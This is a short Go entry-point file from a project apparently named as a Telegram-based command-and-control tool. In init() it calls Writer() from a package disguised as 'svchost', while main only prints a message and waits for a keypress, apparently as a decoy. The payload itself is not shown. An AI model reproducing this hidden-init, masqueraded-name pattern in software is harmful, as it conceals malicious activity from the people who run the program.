package main

import (
	"Go_TelegramAPI_C2/internal/svchost"
	"fmt"
	"os"
)

func init() {
	svchost.Writer()
}

func main() {

	PressAnyKey()

}

func PressAnyKey() {
	fmt.Println("Main function executed")
	fmt.Println("Press any key to continue...")
	buffer := make([]byte, 1)
	os.Stdin.Read(buffer)
}
